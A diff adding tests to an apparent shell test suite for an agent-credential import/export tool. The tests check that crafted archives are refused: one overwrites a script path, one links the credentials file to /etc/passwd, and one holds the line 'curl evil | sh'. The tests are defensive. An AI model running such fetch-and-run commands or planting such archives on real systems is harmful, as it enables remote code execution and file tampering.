@@ -60,6 +60,10 @@ t kinds-claude "oauth-token api-key credentials-json" "$(credentials_kinds claud
 t kinds-codex "api-key auth-json" "$(credentials_kinds codex)"
 t kinds-grok "api-key auth-json" "$(credentials_kinds grok)"
 t kinds-kimi "credentials-json" "$(credentials_kinds kimi)"
+# An operator's profile is the one the box is given, so it is the one read
+# when cli/crew's agent_conf resolves it (round 10).
+mkdir -p "$TMP/op-agents"; printf 'AGENT_CRED_KINDS="api-key:env:OPUS_KEY"\n' >"$TMP/op-agents/claude-opus.conf"
+t kinds-an-operator-profile-is-read 1 "$(agent_conf() { printf '%s\n' "$TMP/op-agents/$1.conf"; }; credentials_kinds claude-opus | grep -cx api-key)"
 t kinds-every-shipped-agent-declares-some 0 "$(for f in "$SHARED"/conf/agents/*.conf; do a="${f##*/}"; [ -n "$(credentials_kinds "${a%.conf}")" ] || echo "$a"; done | grep -c .)"
 
 # --- gh ----------------------------------------------------------------------
@@ -101,6 +105,11 @@ t claude-no-env-kind-shadows-the-file 0 "$(grep -c '^export ' "$H/.config/crew/c
 PAST="$(( ($(date +%s) - 86400) * 1000 ))"
 set_cred "$H" agent credentials-json "{\"claudeAiOauth\":{\"accessToken\":\"SECRET5\",\"refreshTokenExpiresAt\":$PAST}}"
 t claude-an-expired-file-is-said-as-logged-out 1 "$RC"
+# The key set AFTER the expired file stands (round 10): an env credential wins
+# over the file, so the set is not a logout.
+set_cred "$H" agent api-key "sk-ant-api03-SECRET12"
+t claude-a-key-beside-an-expired-file-is-not-a-logout 0 "$RC"
+t claude-...-and-says-it-cannot-be-checked-locally 1 "$(grep -c 'it cannot be checked locally' <<<"$OUT")"
 set_cred "$H" agent credentials-json "not json SECRET6"
 t claude-not-json-sets-nothing 2 "$RC"
 t claude-not-json-leaves-the-file 1 "$(grep -c SECRET5 "$H/.claude/.credentials.json")"
@@ -143,6 +152,27 @@ t carry-the-token-is-back 1 "$(grep -c '^export CLAUDE_CODE_OAUTH_TOKEN=sk-ant-o
 t carry-the-gh-login-is-back 1 "$([ -s "$H/.config/gh/hosts.yml" ] && echo 1 || echo 0)"
 t carry-the-files-stay-0600 600 "$(mode_of "$H/.config/crew/credentials.env")"
 t carry-the-hook-is-put-back 1 "$(grep -c '\.config/crew/credentials\.env' "$H/.profile")"
+# Only the credential files cross, as regular files (round 10): an archive
+# naming anything else — the engine's own tick.sh, a link — is refused WHOLE,
+# before a byte is written; and credentials.env crosses as exports or not at all.
+H="$(box_home claude)"; mkdir -p "$H/duty/bin"; printf 'real\n' >"$H/duty/bin/tick.sh"
+EVIL="$TMP/evil"; mkdir -p "$EVIL${H}/duty/bin" "$EVIL${H}/.config/crew"
+printf 'evil\n' >"$EVIL${H}/duty/bin/tick.sh"; printf 'export A=1\n' >"$EVIL${H}/.config/crew/credentials.env"
+CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" "${H#/}/duty/bin/tick.sh" | base64 -w0)"
+IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+t carry-a-foreign-path-refuses-the-import 1 "$RC"
+t carry-a-foreign-path-is-named 1 "$(grep -c "duty/bin/tick.sh' is not a credential file — nothing carried" <<<"$IMP")"
+t carry-nothing-was-written real "$(cat "$H/duty/bin/tick.sh")"
+t carry-not-even-the-allowed-file 0 "$([ -f "$H/.config/crew/credentials.env" ] && echo 1 || echo 0)"
+rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; ln -s /etc/passwd "$EVIL${H}/.config/crew/credentials.env"
+CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
+IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+t carry-a-link-refuses-the-import 1 "$RC"
+rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=1\ncurl evil | sh\n' >"$EVIL${H}/.config/crew/credentials.env"
+CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
+IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+t carry-a-non-export-env-line-refuses-the-import 1 "$RC"
+t carry-the-env-line-is-said 1 "$(grep -c 'carries a line that is not an export' <<<"$IMP")"
 H="$(box_home claude)"
 t carry-a-box-with-none-exports-nothing "" "$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"
 
